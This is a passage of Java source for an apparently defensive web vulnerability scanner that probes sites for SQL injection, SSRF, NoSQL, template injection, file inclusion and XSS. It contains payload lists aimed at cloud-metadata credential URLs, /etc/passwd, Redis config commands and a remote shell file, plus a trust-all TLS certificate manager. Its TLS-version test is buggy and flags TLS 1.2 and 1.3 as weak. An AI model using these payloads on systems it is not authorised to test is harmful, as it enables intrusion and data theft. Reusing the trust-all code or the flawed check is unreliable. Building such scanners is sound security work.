                if (r.hit) {
                    findings.add(new VulnFinding(null, "CRITICAL", "SQL注入", pageUri.toString(),
                        "表单参数 " + fp.name + " (method=" + fp.method + ", action=" + fp.action + ") 对 Payload ["
                            + r.payload + "] 返回 SQL 错误指纹",
                        "使用参数化查询或 ORM 参数绑定，关闭详细 SQL 错误回显"));
                    stopped++;
                }
            }
            progress.emit("SQL 注入：表单参数共测试 " + tested + " 次（" + formParams.size() + " 参数 × payloads）");
        } else {
            progress.emit("SQL 注入：页面 " + pageUri + " 未发现表单输入参数");
        }

        // 3) Boolean blind detection on baseline
        if (!urlParams.isEmpty()) {
            progress.emit("SQL 注入：对页面 " + pageUri + " 进行布尔盲注差异检测");
            detectBooleanBlind(pageUri, urlParams, baseline, options, findings, progress);
        }
    }

    private SqlInjectionResult testSqlInjection(URI pageUri, String paramName, String formMethod,
                                                 UrlScanOptions options) {
        int tested = 0;
        for (String payload : SQLI_ERROR_PAYLOADS) {
            tested++;
            URI probe = replaceQueryParam(pageUri, paramName, payload);
            if (probe == null) continue;
            PageFetch result = fetchPage(probe, options);
            if (result.error != null) continue;
            if (hasSqlError(result.body)) {
                return new SqlInjectionResult(true, payload, tested);
            }
            if (result.status >= 500 && result.status < 600) {
                // 500-class errors often indicate SQL injection causing server crash
                if (hasAnySqlFingerprint(result.body)) {
                    return new SqlInjectionResult(true, payload, tested);
                }
            }
        }
        return new SqlInjectionResult(false, null, tested);
    }

    private SqlInjectionResult testFormParamSqlInjection(URI pageUri, FormParam fp, UrlScanOptions options) {
        int tested = 0;
        for (String payload : SQLI_ERROR_PAYLOADS) {
            tested++;
            PageFetch result;
            if ("POST".equalsIgnoreCase(fp.method)) {
                result = postFormWithPayload(fp.action, fp.inputs, fp.name, payload, options);
            } else {
                URI probe = replaceQueryParam(fp.action, fp.name, payload);
                if (probe == null) continue;
                result = fetchPage(probe, options);
            }
            if (result.error != null) continue;
            if (hasSqlError(result.body)) {
                return new SqlInjectionResult(true, payload, tested);
            }
            if (result.status >= 500 && result.status < 600) {
                if (hasAnySqlFingerprint(result.body)) {
                    return new SqlInjectionResult(true, payload, tested);
                }
            }
        }
        return new SqlInjectionResult(false, null, tested);
    }

    private void detectBooleanBlind(URI pageUri, Map<String, String> params, PageFetch baseline,
                                     UrlScanOptions options, List<VulnFinding> findings, ScanProgress progress) {
        if (params.isEmpty()) return;
        // Pick the first param for boolean blind testing
        String targetParam = params.keySet().iterator().next();
        int baselineLen = baseline.body != null ? baseline.body.length() : 0;

        // True condition
        String[] truePayloads = {"' AND '1'='1", "') AND ('1'='1", "1 AND 1=1", "' OR '1'='1"};
        // False condition
        String[] falsePayloads = {"' AND '1'='2", "') AND ('1'='2", "1 AND 1=2", "' AND 'x'='y"};

        int trueLen = -1;
        int falseLen = -1;
        String hitPayload = null;

        for (int i = 0; i < truePayloads.length && i < falsePayloads.length; i++) {
            URI trueUri = replaceQueryParam(pageUri, targetParam, truePayloads[i]);
            URI falseUri = replaceQueryParam(pageUri, targetParam, falsePayloads[i]);
            if (trueUri == null || falseUri == null) continue;
            PageFetch trueResp = fetchPage(trueUri, options);
            PageFetch falseResp = fetchPage(falseUri, options);
            trueLen = trueResp.body != null ? trueResp.body.length() : -1;
            falseLen = falseResp.body != null ? falseResp.body.length() : -1;

            int diff = Math.abs(trueLen - falseLen);
            progress.emit("SQL 注入盲注检测：参数 " + targetParam
                + " true[" + truePayloads[i] + "](len=" + trueLen + ")"
                + " vs false[" + falsePayloads[i] + "](len=" + falseLen + ")"
                + " diff=" + diff);

            if (trueLen > 0 && falseLen > 0 && diff >= 50 && trueLen != baselineLen) {
                hitPayload = truePayloads[i];
            }
            // Also check if true response is significantly different from baseline
            if (trueLen > 0 && Math.abs(trueLen - baselineLen) >= 50) {
                hitPayload = truePayloads[i];
            }
            if (hitPayload != null) {
                findings.add(new VulnFinding(null, "CRITICAL", "SQL注入(布尔盲注)", pageUri.toString(),
                    "参数 " + targetParam + " 对布尔条件 Payload [" + hitPayload + "] 返回差异响应"
                        + "（true=" + trueLen + " vs false=" + falseLen + "，diff=" + diff + "）",
                    "使用参数化查询或 ORM 参数绑定"));
                break;
            }
        }
    }

    // ── SQL error detection ──

    private static boolean hasSqlError(String body) {
        if (body == null || body.isBlank()) return false;
        String lower = body.toLowerCase(Locale.ROOT);
        for (String pattern : SQL_ERROR_PATTERNS) {
            try {
                if (Pattern.compile(pattern, Pattern.CASE_INSENSITIVE).matcher(body).find()) {
                    return true;
                }
            } catch (Exception ignored) {
                // fallback to simple contains
                if (lower.contains(pattern.toLowerCase(Locale.ROOT))) return true;
            }
        }
        return false;
    }

    private static boolean hasAnySqlFingerprint(String body) {
        if (body == null || body.isBlank()) return false;
        return hasSqlError(body)
            || body.toLowerCase(Locale.ROOT).matches(".*\\b(sql|syntax|error|exception|driver|database|query|fetch|result|column|table)\\b.*");
    }

    // ── SSRF detection ──

    private static final String[] SSRF_PAYLOADS = {
        // AWS metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        // GCP metadata
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        // Azure metadata
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        // Alibaba Cloud
        "http://100.100.100.200/latest/meta-data/",
        // Internal services
        "http://127.0.0.1:8080/",
        "http://127.0.0.1/",
        "http://localhost/",
        "http://localhost:80/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://127.0.0.1:22/",
        "http://127.0.0.1:6379/",
        "http://127.0.0.1:3306/",
        "http://127.0.0.1:9200/",
        "http://127.0.0.1:27017/",
        // File protocol
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        // DNS rebinding / redirect test
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://192.168.1.1/",
        // SSRF bypass variants
        "http://127.1/",
        "http://0x7f000001/",
        "http://2130706433/",  // decimal IP
        "http://017700000001/", // octal IP
    };

    private static final String[] SSRF_SUCCESS_PATTERNS = {
        // AWS
        "ami-id", "instance-id", "instance-type", "security-credentials",
        "placement/availability-zone", "public-keys/",
        // GCP
        "computeMetadata", "project-id", "service-accounts/",
        // Azure
        "azEnvironment", "resourceGroupName", "subscriptionId",
        // Generic cloud / internal
        "root:", "daemon:", "nobody:",  // /etc/passwd
        "[extensions]",  // windows/win.ini
        "redis_version", "redis_mode",  // Redis INFO
        "mongodb", "MongoDB",  // MongoDB
        "\"version\"", "\"cluster_name\"",  // Elasticsearch
    };

    private void runSsrfChecks(URI pageUri, PageFetch baseline, UrlScanOptions options,
                               List<VulnFinding> findings, ScanProgress progress) {
        Map<String, String> params = queryParams(pageUri);
        if (params.isEmpty()) {
            progress.emit("SSRF 检测：页面 " + pageUri + " 未发现 URL 查询参数");
            return;
        }
        int tested = 0;
        for (String name : params.keySet()) {
            for (String payload : SSRF_PAYLOADS) {
                tested++;
                URI probe = replaceQueryParam(pageUri, name, payload);
                if (probe == null) continue;
                PageFetch result = fetchPage(probe, options);
                if (result.error != null) continue;
                boolean hit = false;
                String evidence = null;
                // Check for SSRF success via content patterns
                if (result.body != null) {
                    for (String pattern : SSRF_SUCCESS_PATTERNS) {
                        if (result.body.toLowerCase(Locale.ROOT).contains(pattern.toLowerCase(Locale.ROOT))) {
                            hit = true;
                            evidence = pattern;
                            break;
                        }
                    }
                }
                String statusLabel = result.status >= 200 && result.status < 400 ? "GET:" + result.status : "HTTP " + result.status;
                if (hit) {
                    progress.emit("SSRF 检测：参数 " + name + " Payload [" + payload + "] -> " + statusLabel + "，命中指纹 [" + evidence + "]");
                    findings.add(new VulnFinding(null, "CRITICAL", "SSRF", probe.toString(),
                        "参数 " + name + " 可注入内网地址，响应命中云元数据/内网服务指纹: " + evidence,
                        "对 URL 参数做严格白名单校验，禁止内网 IP、localhost、file:// 等协议"));
                    break;
                } else {
                    progress.emit("SSRF 检测：参数 " + name + " Payload [" + payload + "] -> " + statusLabel + "，未命中指纹");
                }
            }
        }
        progress.emit("SSRF 检测：共测试 " + tested + " 次（" + params.size() + " 参数 × " + SSRF_PAYLOADS.length + " payloads）");
    }

    // ── NoSQL injection detection ──

    private static final String[] NOSQL_PAYLOADS = {
        // MongoDB operator injection
        "{\"$ne\": null}",
        "{\"$gt\": \"\"}",
        "{\"$regex\": \".*\"}",
        "{\"$where\": \"1==1\"}",
        "{\"$exists\": true}",
        "{\"$in\": [\"admin\", \"root\"]}",
        "{\"$nin\": []}",
        "{\"$size\": 0}",
        "{\"$or\": [{\"username\": \"admin\"}, {\"password\": {\"$ne\": null}}]}",
        "{\"$and\": [{\"$gt\": \"\"}, {\"$lt\": \"z\"}]}",
        // JSON injection with operators
        "username[$ne]=admin&password[$ne]=x",
        "username[$regex]=.*&password[$ne]=x",
        "username[$gt]=&password[$gt]=",
        // PHP array injection (sometimes used for NoSQL)
        "user[$ne]=admin&pass[$ne]=x",
        "user[$regex]=.*&pass[$ne]=x",
        // Redis command injection (via URL/body)
        "\r\nSET hacked true\r\n",
        "\r\nCONFIG SET dir /tmp\r\n",
        "\r\nINFO\r\n",
    };

    private static final String[] NOSQL_ERROR_PATTERNS = {
        "MongoError", "MongoServerError", "mongo",
        "MongoDB", "BSON", "ObjectId",
        "Cannot use '",
        "$ne must",
        "$regex has to be",
        "unknown operator:",
        "MongoParseError",
        "redis", "Redis", "RedisException",
        "WRONGTYPE", "ERR wrong",
        "NOAUTH", "READONLY",
    };

    private void runNoSqlInjectionChecks(URI pageUri, PageFetch baseline, UrlScanOptions options,
                                          List<VulnFinding> findings, ScanProgress progress) {
        // 1) URL query parameter injection
        Map<String, String> params = queryParams(pageUri);
        if (!params.isEmpty()) {
            int tested = 0;
            for (String name : params.keySet()) {
                for (String payload : NOSQL_PAYLOADS) {
                    tested++;
                    URI probe = replaceQueryParam(pageUri, name, payload);
                    if (probe == null) continue;
                    PageFetch result = fetchPage(probe, options);
                    if (result.error != null) continue;
                    if (result.body != null && hasNoSqlError(result.body)) {
                        findings.add(new VulnFinding(null, "CRITICAL", "NoSQL注入", probe.toString(),
                            "URL 参数 " + name + " 对 Payload [" + truncate(payload, 50) + "] 返回 NoSQL 错误指纹",
                            "使用参数化查询，对用户输入做严格类型校验和过滤"));
                        progress.emit("NoSQL 注入：参数 " + name + " Payload [" + truncate(payload, 40) + "] -> HTTP " + result.status + "，命中 NoSQL 指纹");
                        break;
                    }
                }
            }
            progress.emit("NoSQL 注入：URL 参数共测试 " + tested + " 次");
        }
        // 2) Form parameter injection
        List<FormParam> formParams = extractFormParams(baseline.body, pageUri);
        if (!formParams.isEmpty()) {
            int tested = 0;
            for (FormParam fp : formParams) {
                for (String payload : NOSQL_PAYLOADS) {
                    tested++;
                    PageFetch result;
                    if ("POST".equalsIgnoreCase(fp.method)) {
                        result = postFormWithPayload(fp.action, fp.inputs, fp.name, payload, options);
                    } else {
                        URI probe = replaceQueryParam(pageUri, fp.name, payload);
                        if (probe == null) continue;
                        result = fetchPage(probe, options);
                    }
                    if (result.error != null) continue;
                    if (result.body != null && hasNoSqlError(result.body)) {
                        findings.add(new VulnFinding(null, "CRITICAL", "NoSQL注入", fp.action.toString(),
                            "表单参数 " + fp.name + " (method=" + fp.method + ") 对 Payload [" + truncate(payload, 50) + "] 返回 NoSQL 错误指纹",
                            "使用参数化查询，对用户输入做严格类型校验"));
                        break;
                    }
                }
            }
            progress.emit("NoSQL 注入：表单参数共测试 " + tested + " 次");
        }
    }

    private static boolean hasNoSqlError(String body) {
        if (body == null || body.isBlank()) return false;
        String lower = body.toLowerCase(Locale.ROOT);
        for (String pattern : NOSQL_ERROR_PATTERNS) {
            if (lower.contains(pattern.toLowerCase(Locale.ROOT))) return true;
        }
        return false;
    }

    // ── CORS misconfiguration check ──

    private void checkCorsHeaders(Map<String, List<String>> headers, String url, List<VulnFinding> findings) {
        String acao = firstHeader(headers, "Access-Control-Allow-Origin");
        String acac = firstHeader(headers, "Access-Control-Allow-Credentials");

        if (acao == null) return; // No CORS configured, not a vulnerability per se

        boolean hasCredentials = "true".equalsIgnoreCase(acac);
        String acaoLower = acao.trim().toLowerCase(Locale.ROOT);

        // Wildcard origin
        if ("*".equals(acao.trim())) {
            if (hasCredentials) {
                findings.add(new VulnFinding(null, "CRITICAL", "CORS配置错误", url,
                    "Access-Control-Allow-Origin 设为 * 且同时启用 credentials，浏览器会拒绝但仍为严重配置错误",
                    "将 Allow-Origin 限定为白名单域名，避免与 credentials 同时使用通配符"));
            } else {
                findings.add(new VulnFinding(null, "MEDIUM", "CORS配置宽松", url,
                    "Access-Control-Allow-Origin 设为 *，允许任意来源访问 API 响应",
                    "如 API 涉及敏感数据，应将 Allow-Origin 限定为具体受信域名"));
            }
        }

        // null origin allowed (sandboxed iframes, local files)
        if ("null".equalsIgnoreCase(acao.trim())) {
            findings.add(new VulnFinding(null, "HIGH", "CORS允许null来源", url,
                "Access-Control-Allow-Origin 设为 null，允许 sandbox 环境和本地文件访问",
                "移除 null 来源支持，除非业务确需支持"));
        }

        // Check for origin reflection (dangerous: server echoes back any Origin)
        // We can't fully test this without sending an Origin header, but flag if the value
        // looks dynamic — non-asterisk, non-null, and site-specific patterns may indicate reflection
        if (!"*".equals(acao.trim()) && !"null".equalsIgnoreCase(acao.trim())
            && acaoLower.contains("{") && acaoLower.contains("}")) {
            findings.add(new VulnFinding(null, "LOW", "CORS动态模板", url,
                "Access-Control-Allow-Origin 值包含模板变量: " + acao,
                "确认服务端是否反射任意 Origin 头，避免被恶意网站利用"));
        }
    }

    // ── SSTI (Server-Side Template Injection) detection ──

    private static final String[] SSTI_PAYLOADS = {
        // Jinja2 / Flask
        "{{7*7}}", "{{config}}", "{{self.__class__.__mro__}}", "{{''.__class__.__bases__}}",
        // Freemarker (Java)
        "${7*7}", "${product.name}", "<#assign x=7*7>${x}",
        // Velocity (Java)
        "#set($x=7*7)$x",
        // Thymeleaf (Java) / Spring Expression
        "${T(java.lang.Runtime).getRuntime()}",
        "*{T(java.lang.Runtime).getRuntime()}",
        // ERB / Ruby
        "<%=7*7%>",
        // Smarty / PHP
        "{php}echo 7*7;{/php}",
        // Twig / PHP
        "{{_self}}",
        // Generic
        "{{7*'7'}}", "${7*7}",
        // Blind detection via math
        "{{49}}",  // baseline — unlikely to be reflected exactly as-is in many contexts
        // Mako / Python
        "${7*7}",
    };

    private void runSstiChecks(URI pageUri, PageFetch baseline, UrlScanOptions options,
                                List<VulnFinding> findings, ScanProgress progress) {
        Map<String, String> params = queryParams(pageUri);
        if (params.isEmpty()) {
            progress.emit("SSTI 检测：页面 " + pageUri + " 未发现 URL 查询参数");
            return;
        }
        int tested = 0;
        for (String name : params.keySet()) {
            for (String payload : SSTI_PAYLOADS) {
                tested++;
                URI probe = replaceQueryParam(pageUri, name, payload);
                if (probe == null) continue;
                PageFetch result = fetchPage(probe, options);
                if (result.error != null) continue;
                // SSTI success patterns: math evaluation (49), leaked config/internals
                boolean hit = false;
                String evidence = null;
                if (result.body != null) {
                    // Math payloads: {{7*7}} should produce 49 in output
                    if (payload.contains("7*7") && result.body.contains("49")) {
                        hit = true;
                        evidence = "数学表达式被求值(49)";
                    }
                    // Config/internal leaks
                    if ((payload.contains("{{config}}") || payload.contains("{{_self}}") || payload.contains("__class__"))
                        && !result.body.contains(payload)) {
                        // Payload disappeared (likely executed) but didn't produce literal match
                        String lower = result.body.toLowerCase(Locale.ROOT);
                        if (lower.contains("config") || lower.contains("secret") || lower.contains("debug")
                            || lower.contains("werkzeug") || lower.contains("flask")) {
                            hit = true;
                            evidence = "疑似模板引擎内部对象泄露";
                        }
                    }
                }
                if (hit) {
                    progress.emit("SSTI 检测：参数 " + name + " Payload [" + payload + "] -> " + evidence);
                    findings.add(new VulnFinding(null, "CRITICAL", "SSTI模板注入", probe.toString(),
                        "参数 " + name + " 对模板注入 Payload [" + payload + "] 产生异常响应: " + evidence,
                        "避免将用户输入直接传入模板渲染函数，使用沙箱或禁用危险标签"));
                    break;
                }
            }
        }
        progress.emit("SSTI 检测：共测试 " + tested + " 次");
    }

    // ── LFI / RFI (Local / Remote File Inclusion) detection ──

    private static final String[] LFI_PAYLOADS = {
        // Standard path traversal
        "../../../../etc/passwd",
        "../../../../etc/hosts",
        "..\\..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "c:\\windows\\win.ini",
        // Nested traversal (WAF bypass)
        "....//....//....//....//etc/passwd",
        "..;/..;/..;/..;/etc/passwd",
        // PHP wrappers
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input",
        // Data URI / RFI
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "http://example.com/shell.txt",
        // Null byte (legacy PHP <5.3)
        "../../../../etc/passwd%00",
        "../../../../etc/passwd%00.html",
        // Double URL encoding
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        // Upper/lower case bypass
        "..%5c..%5c..%5c..%5cWindows%5cwin.ini",
    };

    private static final String[] LFI_SUCCESS_PATTERNS = {
        "root:", "daemon:", "bin:", "nobody:", "mysql:",  // /etc/passwd
        "[extensions]", "fonts",  // win.ini
        "127.0.0.1", "localhost",  // /etc/hosts
        "<?php", "<?=",  // PHP source leak
        "function ", "class ", "public ",  // PHP/Java source
        "PD9waHA=",  // base64 PHP tag
        "eval(", "system(",  // Code execution indicators
    };

    private void runLfiChecks(URI pageUri, PageFetch baseline, UrlScanOptions options,
                               List<VulnFinding> findings, ScanProgress progress) {
        Map<String, String> params = queryParams(pageUri);
        if (params.isEmpty()) {
            progress.emit("LFI 检测：页面 " + pageUri + " 未发现 URL 查询参数");
            return;
        }
        int tested = 0;
        for (String name : params.keySet()) {
            for (String payload : LFI_PAYLOADS) {
                tested++;
                URI probe = replaceQueryParam(pageUri, name, payload);
                if (probe == null) continue;
                PageFetch result = fetchPage(probe, options);
                if (result.error != null) continue;
                boolean hit = false;
                String evidence = null;
                // Only check successful responses (200)
                if (result.status >= 200 && result.status < 300 && result.body != null) {
                    for (String pattern : LFI_SUCCESS_PATTERNS) {
                        if (result.body.contains(pattern)) {
                            hit = true;
                            evidence = pattern;
                            break;
                        }
                    }
                    // Also detect PHP wrapper base64 decode success
                    if (payload.contains("base64-encode") && result.body.length() > 100
                        && !result.body.contains("failed to open stream")
                        && !result.body.contains("Warning:")) {
                        hit = true;
                        evidence = "PHP base64 filter wrapper 返回编码内容";
                    }
                }
                if (hit) {
                    progress.emit("LFI 检测：参数 " + name + " Payload [" + payload + "] -> 命中指纹 [" + evidence + "]");
                    findings.add(new VulnFinding(null, "CRITICAL", "文件包含(LFI)", probe.toString(),
                        "参数 " + name + " 的文件包含 Payload 响应包含敏感文件内容: " + evidence,
                        "白名单限制文件访问路径，规范化输入并拒绝路径遍历字符"));
                    break;
                }
            }
        }
        progress.emit("LFI 检测：共测试 " + tested + " 次");
    }

    // ── Directory listing check ──

    private static final String[] DIR_LISTING_PATTERNS = {
        "<title>Index of ", "Directory Listing For", "Directory: ",
        "<h1>Index of ", "Parent Directory</a>", "Last modified</th>",
        "[DIR]", "&lt;dir&gt;",
        "<title>Directory listing for ", "to parent directory",
    };

    private void checkDirectoryListing(PageFetch page, String url, List<VulnFinding> findings, ScanProgress progress) {
        if (page.body == null || page.body.isBlank()) return;
        // Only check paths ending with / (directories)
        String path = URI.create(url).getPath();
        if (path == null || !path.endsWith("/")) return;
        String lower = page.body.toLowerCase(Locale.ROOT);
        for (String pattern : DIR_LISTING_PATTERNS) {
            if (lower.contains(pattern.toLowerCase(Locale.ROOT))) {
                progress.emit("目录遍历：页面 " + url + " 命中目录列表指纹 [" + pattern + "]");
                findings.add(new VulnFinding(null, "MEDIUM", "目录列表暴露", url,
                    "目录开启了文件列表功能，可能泄露源码和敏感文件",
                    "在 Web 服务器配置中关闭目录索引（如 nginx 'autoindex off'，Apache '-Indexes'）"));
                return;
            }
        }
    }

    // ── TLS / SSL security check ──

    private void checkTlsSecurity(URI baseUri, List<VulnFinding> findings, ScanProgress progress) {
        if (!"https".equalsIgnoreCase(baseUri.getScheme())) {
            progress.emit("TLS 检查：目标使用 HTTP，未启用 HTTPS 加密");
            findings.add(new VulnFinding(null, "HIGH", "未启用HTTPS", baseUri.toString(),
                "目标使用明文 HTTP 协议，数据在传输中可能被窃听或篡改",
                "强制启用 HTTPS，配置 HTTP 到 HTTPS 的 301 重定向并启用 HSTS"));
            return;
        }
        String host = baseUri.getHost();
        int port = baseUri.getPort() > 0 ? baseUri.getPort() : 443;
        try {
            javax.net.ssl.SSLContext ctx = javax.net.ssl.SSLContext.getInstance("TLS");
            ctx.init(null, new javax.net.ssl.TrustManager[] {new javax.net.ssl.X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) { }
                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) { }
            }}, null);
            javax.net.ssl.SSLSocket socket = (javax.net.ssl.SSLSocket) ctx.getSocketFactory().createSocket(host, port);
            socket.setSoTimeout(10000);
            socket.startHandshake();

            String protocol = socket.getSession().getProtocol();
            java.security.cert.Certificate[] certs = socket.getSession().getPeerCertificates();
            socket.close();

            // Check TLS version
            if (protocol == null || protocol.contains("TLSv1") || protocol.contains("TLSv1.0") || protocol.contains("TLSv1.1")) {
                findings.add(new VulnFinding(null, "MEDIUM", "弱TLS版本", baseUri.toString(),
                    "服务器支持的 TLS 版本: " + protocol + "，存在已知安全缺陷",
                    "禁用 TLS 1.0/1.1，仅启用 TLS 1.2+"));
            }

            // Check certificate expiry
            if (certs != null && certs.length > 0 && certs[0] instanceof java.security.cert.X509Certificate) {
                java.security.cert.X509Certificate cert = (java.security.cert.X509Certificate) certs[0];
                long daysLeft = (cert.getNotAfter().getTime() - System.currentTimeMillis()) / (1000L * 60 * 60 * 24);
                if (daysLeft < 0) {
                    findings.add(new VulnFinding(null, "HIGH", "SSL证书已过期", baseUri.toString(),
                        "证书有效期截止于 " + cert.getNotAfter() + "，已过期 " + Math.abs(daysLeft) + " 天",
                        "立即更新 SSL 证书"));
                } else if (daysLeft < 30) {
                    findings.add(new VulnFinding(null, "MEDIUM", "SSL证书即将过期", baseUri.toString(),
                        "证书有效期截止于 " + cert.getNotAfter() + "，剩余 " + daysLeft + " 天",
                        "尽快续期 SSL 证书"));
                }

                // Check self-signed
                String issuer = cert.getIssuerDN().getName();
                String subject = cert.getSubjectDN().getName();
                if (issuer.equals(subject)) {
                    findings.add(new VulnFinding(null, "LOW", "自签名SSL证书", baseUri.toString(),
                        "证书为自签名 (Issuer=Subject)，客户端会收到安全警告",
                        "使用 Let's Encrypt 或商业 CA 签发的证书"));
                }
            }

            progress.emit("TLS 检查：协议 " + protocol + "，证书验证完成");
        } catch (Exception e) {
            String msg = e.getMessage();
            if (msg != null && (msg.contains("unable to find valid certification path")
                || msg.contains("self-signed") || msg.contains("PKIX"))) {
                findings.add(new VulnFinding(null, "MEDIUM", "SSL证书不可信", baseUri.toString(),
                    "证书验证失败: " + msg, "使用受信任 CA 签发的证书"));
                progress.emit("TLS 检查：证书不可信 — " + msg);
            } else {
                progress.emit("TLS 检查：连接失败 — " + (msg != null ? msg : "未知错误"));
            }
        }
    }

    // ── Form parameter extraction ──

    private static List<FormParam> extractFormParams(String html, URI pageUri) {
        List<FormParam> params = new ArrayList<>();
        if (html == null || html.isBlank()) return params;
        Matcher formMatcher = FORM_TAG.matcher(html);
        while (formMatcher.find()) {
            String formTag = formMatcher.group();
            int formEnd = html.indexOf("</form>", formMatcher.end());
            String formBody = html.substring(formMatcher.start(),
                formEnd > formMatcher.end() ? Math.min(formEnd + 7, html.length())
                    : Math.min(formMatcher.end() + 4000, html.length()));
            String method = matchAttr(METHOD, formTag, "get").trim();
            String action = matchAttr(ACTION, formTag, pageUri.toString()).trim();
            URI actionUri = resolveUrl(pageUri, action);
            if (actionUri == null) actionUri = pageUri;
            Map<String, String> inputs = extractFormInputNames(formBody);
            for (String inputName : inputs.keySet()) {
                params.add(new FormParam(inputName, method, actionUri, inputs));
            }
        }
        return params;
    }

    private static Map<String, String> extractFormInputNames(String formHtml) {
        Map<String, String> inputs = new LinkedHashMap<>();
        Matcher m = INPUT_TAG.matcher(formHtml);
        while (m.find()) {
            String tag = m.group();
            String name = matchAttr(Pattern.compile("name\\s*=\\s*[\"']([^\"']+)[\"']", Pattern.CASE_INSENSITIVE), tag, null);
            String type = matchAttr(Pattern.compile("type\\s*=\\s*[\"']([^\"']+)[\"']", Pattern.CASE_INSENSITIVE), tag, "text");
            if (name != null && !name.isBlank() && !"submit".equalsIgnoreCase(type)
                && !"button".equalsIgnoreCase(type) && !"reset".equalsIgnoreCase(type)
                && !"image".equalsIgnoreCase(type) && !"file".equalsIgnoreCase(type)) {
                String value = matchAttr(Pattern.compile("value\\s*=\\s*[\"']([^\"']*)[\"']", Pattern.CASE_INSENSITIVE), tag, name);
                inputs.put(name, value);
            }
        }
        return inputs;
    }

    private PageFetch postFormWithPayload(URI actionUri, Map<String, String> allInputs,
                                           String targetParam, String payload, UrlScanOptions options) {
        try {
            URL url = actionUri.toURL();
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(12000);
            conn.setInstanceFollowRedirects(false);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 SecurityScanner/3.0");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            for (Map.Entry<String, String> header : options.headers.entrySet()) {
                conn.setRequestProperty(header.getKey(), header.getValue());
            }
            // Build form body with payload injected into target parameter
            StringBuilder sb = new StringBuilder();
            for (Map.Entry<String, String> entry : allInputs.entrySet()) {
                if (sb.length() > 0) sb.append('&');
                String val = entry.getKey().equals(targetParam) ? payload : entry.getValue();
                sb.append(urlEncode(entry.getKey())).append('=').append(urlEncode(val));
            }
            byte[] body = sb.toString().getBytes(StandardCharsets.UTF_8);
            conn.setDoOutput(true);
            conn.getOutputStream().write(body);
            conn.getOutputStream().flush();
            conn.getOutputStream().close();
            int status = conn.getResponseCode();
            Map<String, List<String>> headers = conn.getHeaderFields();
            String contentType = conn.getContentType();
            String respBody = "";
            if (isTextContent(contentType)) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                    status >= 400 ? conn.getErrorStream() : conn.getInputStream(), StandardCharsets.UTF_8))) {
                    respBody = readLimited(reader, MAX_BODY_CHARS);
                }
            }
            conn.disconnect();
            return new PageFetch(status, headers, contentType, respBody, null);
        } catch (Exception e) {
            return new PageFetch(0, Collections.emptyMap(), "", "", e.getMessage());
        }
    }

    private static String urlEncode(String value) {
        if (value == null) return "";
        try {
            return java.net.URLEncoder.encode(value, StandardCharsets.UTF_8);
        } catch (Exception ignored) {
            return value;
        }
    }

    // ── Value objects ──

    private static class SqlInjectionResult {
        final boolean hit;
        final String payload;
        final int tested;

        SqlInjectionResult(boolean hit, String payload, int tested) {
            this.hit = hit;
            this.payload = payload;
            this.tested = tested;
        }
    }

    private static class FormParam {
        final String name;
        final String method;
        final URI action;
        final Map<String, String> inputs;

        FormParam(String name, String method, URI action, Map<String, String> inputs) {
            this.name = name;
            this.method = method;
            this.action = action;
            this.inputs = inputs;
        }
    }

    // ── XSS reflection payloads (covering multiple injection contexts) ──
    private static final String[] XSS_PAYLOADS = {
        // Tag breakout
        "\"><svg/onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "\"><body onload=alert(1)>",
        "';alert(1);//",
        "\" onfocus=alert(1) autofocus=\"",
        "\" onmouseover=alert(1) x=\"",
        // Script injection
        "\"><script>alert(1)</script>",
        "</script><script>alert(1)</script>",
        // Event handler variations
        "\" onpointerenter=alert(1) style=\"display:block",
        "\" onanimationend=alert(1) style=\"animation:0s x",
        // Template / Angular expressions
        "{{constructor.constructor('alert(1)')()}}",
        // DOM-based / innerHTML contexts
        "<img src=x onerror=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    };

    private void runXssProbeChecks(URI pageUri, PageFetch baseline, UrlScanOptions options,
                                   List<VulnFinding> findings, ScanProgress progress) {
        Map<String, String> params = queryParams(pageUri);
        if (params.isEmpty()) {
            progress.emit("XSS 检测：页面 " + pageUri + " 未发现 URL 查询参数，跳过反射 payload 测试");
            return;
        }
        for (String name : params.keySet()) {
            for (String payload : XSS_PAYLOADS) {
                URI probe = replaceQueryParam(pageUri, name, payload);
                if (probe == null) continue;
                PageFetch result = fetchPage(probe, options);
                boolean reflected = result.body != null && result.body.contains(payload);
                progress.emit("XSS 检测：参数 " + name + " Payload [" + truncate(payload, 40) + "] -> HTTP " + result.status + "，反射=" + (reflected ? "是" : "否"));
                if (reflected) {
                    findings.add(new VulnFinding(null, "HIGH", "XSS", probe.toString(),
                        "参数 " + name + " 的 XSS payload 被页面原样反射: " + payload,
                        "对输出进行 HTML 编码，按上下文过滤危险字符，并启用 CSP"));
                    break; // Stop testing more payloads on this param once confirmed
                }
            }
        }
    }

    private void checkSensitivePaths(URI baseUri, UrlScanOptions options, List<VulnFinding> findings, ScanProgress progress) {
        URI origin = URI.create(baseUri.getScheme() + "://" + baseUri.getAuthority());
        for (String path : options.sensitivePaths()) {
            URI probe = origin.resolve(path);
            PageFetch page = fetchPage(probe, options);
            if (page.error != null) {
                progress.emit("敏感路径：" + path + " 请求失败，原因：" + page.error);
                continue;
            }
            if (isAccessDenied(page)) {
                progress.emit("敏感路径：" + path + " -> HTTP " + page.status + "，认证保护生效，未暴露");
                continue;
            }
